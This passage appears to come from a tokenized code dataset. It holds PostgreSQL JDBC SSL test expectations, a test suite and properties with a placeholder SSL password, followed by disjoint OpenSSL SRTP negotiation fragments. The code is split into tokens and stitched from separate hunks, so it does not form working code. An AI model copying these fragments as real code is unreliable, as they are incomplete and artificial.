"-", "caGG", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "ANY", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "ssloff9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_ON", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_ON", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_ON", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_ON", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostnossl9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostgh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "work", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostsslgh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "HOSTNAME", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostbh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "work", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "FALSE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostsslbh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostsslcertgh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "HOSTNAME", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslhostsslcertbh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "defaultexpected", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "disableGG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableGB", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "disableBG", "\"", ",", "new", "Object", "[", "]{", "PG_HBA_OFF", ",", "Boolean", ".", "FALSE", "}", ");", "work", ".", "put", "(", "\"", "allowGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "allowBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEALLOW", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferGB", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "preferBG", "\"", ",", "new", "Object", "[", "]{", "SSLMODEPREFER", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireGB", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "requireBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "caBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "null", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGB", "\"", ",", "new", "Object", "[", "]{", "VALIDATOR", ",", "Boolean", ".", "TRUE", "}", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullBG", "\"", ",", "new", "Object", "[", "]{", "BROKEN", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslcertgh9", "\"", ",", "work", ")", ";", "work", "=", "(", "TreeMap", ")", "work", ".", "clone", "(", ");", "work", ".", "put", "(", "\"", "verify", "-", "fullGG", "\"", ",", "new", "Object", "[", "]{", "HOSTNAME", ",", "Boolean", ".", "TRUE", "}", ");", "expectedmap", ".", "put", "(", "\"", "sslcertbh9", "\"", ",", "work", ")", ";", "import", "org", ".", "postgresql", ".", "test", ".", "TestUtil", ";", "import", "junit", ".", "framework", ".", "TestSuite", ";", "import", "java", ".", "util", ".", "Properties", ";", "public", "class", "SslTestSuite", "extends", "TestSuite", "{", "private", "static", "Properties", "prop", ";", "private", "static", "void", "add", "(", "TestSuite", "suite", ",", "String", "param", ")", "{", "if", "(", "prop", ".", "getProperty", "(", "param", ",", "\"", "\")", ".", "equals", "(", "\"\"", "))", "{", "System", ".", "out", ".", "println", "(", "\"", "Skipping", "\"", "+", "param", "+", "\"", ".\"", ");", "}", "else", "{", "suite", ".", "addTest", "(", "SslTest", ".", "getSuite", "(", "prop", ",", "param", ")", ");", "}", "}", "/", "*", "*", "The", "main", "entry", "point", "for", "JUnit", "*", "/", "public", "static", "TestSuite", "suite", "(", ")", "throws", "Exception", "{", "TestSuite", "suite", "=", "new", "TestSuite", "(", ");", "prop", "=", "TestUtil", ".", "loadPropertyFiles", "(", "\"", "ssltest", ".", "properties", "\"", ");", "add", "(", "suite", ",", "\"", "ssloff9", "\"", ");", "add", "(", "suite", ",", "\"", "sslhostnossl9", "\"", ");", "String", "[", "]", "hostModes", "=", "{", "\"", "sslhost", "\"", ",", "\"", "sslhostssl", "\"", ",", "\"", "sslhostsslcert", "\"", ",", "\"", "sslcert", "\"", "};", "String", "[", "]", "certModes", "=", "{", "\"", "gh", "\"", ",", "\"", "bh", "\"", "};", "for", "(", "String", "hostMode", ":", "hostModes", ")", "{", "for", "(", "String", "certMode", ":", "certModes", ")", "{", "add", "(", "suite", ",", "hostMode", "+", "certMode", "+", "\"", "9", "\"", ");", "}", "}", "TestUtil", ".", "initDriver", "(", ");", "return", "suite", ";", "}", "#", "Uncomment", "to", "enable", "testing", "of", "SingleCertValidatingFactory", "#", "testsinglecertfactory", "=", "true", "ssloff9", "=", "ssloff9prefix", "=", "#", "sslhostnossl9", "=", "jdbc", ":", "postgresql", ":", "//", "localhost", ":", "5432", "/", "hostnossldb", "?", "sslpassword", "=", "sslpwd", "sslhostnossl9prefix", "=", "#", "sslhostgh9", "=", "jdbc", ":", "postgresql", ":", "//", "localhost", ":", "5432", "/", "hostdb", "?", "sslpassword", "=", "sslpwd", "sslhostgh9prefix", "=", "#", "sslhostbh9", "=", "jdbc", ":", "postgresql", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "5432", "/", "hostdb", "?", "sslpassword", "=", "sslpwd", "sslhostbh9prefix", "=", "#", "sslhostsslgh9", "=", "jdbc", ":", "postgresql", ":", "//", "localhost", ":", "5432", "/", "hostssldb", "?", "sslpassword", "=", "sslpwd", "sslhostsslgh9prefix", "=", "#", "sslhostsslbh9", "=", "jdbc", ":", "postgresql", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "5432", "/", "hostssldb", "?", "sslpassword", "=", "sslpwd", "sslhostsslbh9prefix", "=", "#", "sslhostsslcertgh9", "=", "jdbc", ":", "postgresql", ":", "//", "localhost", ":", "5432", "/", "hostsslcertdb", "?", "sslpassword", "=", "sslpwd", "sslhostsslcertgh9prefix", "=", "#", "sslhostsslcertbh9", "=", "jdbc", ":", "postgresql", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "5432", "/", "hostsslcertdb", "?", "sslpassword", "=", "sslpwd", "sslhostsslcertbh9prefix", "=", "#", "sslcertgh9", "=", "jdbc", ":", "postgresql", ":", "//", "localhost", ":", "5432", "/", "certdb", "?", "sslpassword", "=", "sslpwd", "sslcertgh9prefix", "=", "#", "sslcertbh9", "=", "jdbc", ":", "postgresql", ":", "//", "127", ".", "0", ".", "0", ".", "1", ":", "5432", "/", "certdb", "?", "sslpassword", "=", "sslpwd", "sslcertbh9prefix", "="], "docstring_tokens": ["by", "providing", "a", "certificate", "for", "the", "wrong", "host"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "sk_SRTP_PROTECTION_PROFILE_find", "(", "profiles", ",", "p", ")", ">", "=", "0", ")", "{", "SSLerr", "(", "SSL_F_SSL_CTX_MAKE_PROFILES", ",", "SSL_R_BAD_SRTP_PROTECTION_PROFILE_LIST", ")", ";", "sk_SRTP_PROTECTION_PROFILE_free", "(", "profiles", ")", ";", "return", "1", ";", "}", "sk_SRTP_PROTECTION_PROFILE_free", "(", "profiles", ")", ";", "SRTP_PROTECTION_PROFILE", "*", "sprof", ";", "STACK_OF", "(", "SRTP_PROTECTION_PROFILE", ")", "*", "srvr", ";", "int", "i", ",", "srtp_pref", ";", "unsigned", "int", "id", ";", "srvr", "=", "SSL_get_srtp_profiles", "(", "s", ")", ";", "s", "-", ">", "srtp_profile", "=", "NULL", ";", "/", "*", "Search", "all", "profiles", "for", "a", "match", "initially", "*", "/", "srtp_pref", "=", "sk_SRTP_PROTECTION_PROFILE_num", "(", "srvr", ")", ";", "/", "*", "*", "Only", "look", "for", "match", "in", "profiles", "of", "higher", "preference", "than", "*", "current", "match", ".", "*", "If", "no", "profiles", "have", "been", "have", "been", "configured", "then", "this", "*", "does", "nothing", ".", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "srtp_pref", ";", "i", "+", "+)", "sprof", "=", "sk_SRTP_PROTECTION_PROFILE_value", "(", "srvr", ",", "i", ")", ";", "if", "(", "sprof", "-", ">", "id", "=", "=", "id", ")", "{", "s", "-", ">", "srtp_profile", "=", "sprof", ";", "srtp_pref", "=", "i", ";", "break", ";", "}", "return", "0", ";", "if", "(", "SSL_IS_DTLS", "(", "s", ")", "&", "&", "SSL_get_srtp_profiles", "(", "s", ")", ")", "if", "(", "SSL_IS_DTLS", "(", "s", ")", "&", "&", "s", "-", ">", "srtp_profile", ")", "else", "if", "(", "SSL_IS_DTLS", "(", "s", ")", "&", "&", "SSL_get_srtp_profiles", "(", "s", ")", "&", "&", "type", "=", "=", "TLSEXT_TYPE_use_srtp", ")", "else", "if", "(", "SSL_IS_DTLS", "(", "s", ")", "&", "&", "type", "=", "=", "TLSEXT_TYPE_use_srtp", ")</s>static", "int", "find_profile_by_num", "(", "unsigned", "profile_num", ",", "SRTP_PROTECTION_PROFILE", "*", "*", "pptr", ")", "{", "SRTP_PROTECTION_PROFILE", "*", "p", ";", "p", "=", "srtp_known_profiles", ";", "while", "(", "p", "-", ">", "name", ")", "{", "if", "(", "p", "-", ">", "id", "=", "=", "profile_num", ")", "{", "*", "pptr", "=", "p", ";", "return", "0", ";", "}", "p", "+", "+;", "}", "return", "1", ";", "}", "SRTP_PROTECTION_PROFILE", "*", "cprof", ",", "*", "sprof", ";", "STACK_OF", "(", "SRTP_PROTECTION_PROFILE", ")", "*", "clnt", "=", "0", ",", "*", "srvr", ";", "int", "i", ",", "j", ";", "int", "id", ";", "int", "ret", ";", "clnt", "=", "sk_SRTP_PROTECTION_PROFILE_new_null", "(", ");", "if", "(", "!", "find_profile_by_num", "(", "id", ",", "&", "cprof", ")", ")", "sk_SRTP_PROTECTION_PROFILE_push", "(", "clnt", ",", "cprof", ")", ";", "}", "else", "{", ";", "/", "*", "Ignore", "*", "/", "srvr", "=", "SSL_get_srtp_profiles", "(", "s", ")", ";", "/", "*", "Pick", "our", "most", "preferred", "profile", ".", "If", "no", "profiles", "have", "been", "configured", "then", "the", "outer", "loop", "doesn", "'", "t", "run", "(", "sk_SRTP_PROTECTION_PROFILE_num", "(", ")", "=", "-", "1", ")", "and", "so", "we", "just", "return", "without", "doing", "anything", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "sk_SRTP_PROTECTION_PROFILE_num", "(", "srvr", ")", ";", "i", "+", "+)", "{", "sprof", "=", "sk_SRTP_PROTECTION_PROFILE_value", "(", "srvr", ",", "i", ")", ";", "for", "(", "j", "=", "0", ";", "j", "<", "sk_SRTP_PROTECTION_PROFILE_num", "(", "clnt", ")", ";", "j", "+", "+)", "{", "cprof", "=", "sk_SRTP_PROTECTION_PROFILE_value", "(", "clnt", ",", "j", ")", ";", "if", "(", "cprof", "-", ">", "id", "=", "=", "sprof", "-", ">", "id", ")", "{", "s", "-", ">", "srtp_profile", "=", "sprof", ";", "*", "al", "=", "0", ";", "ret", "=", "0", ";", "goto", "done", ";", "}", "}", "}", "ret", "=", "0", ";", "done", ":", "if", "(", "clnt", ")", "sk_SRTP_PROTECTION_PROFILE_free", "(", "clnt", ")", ";", 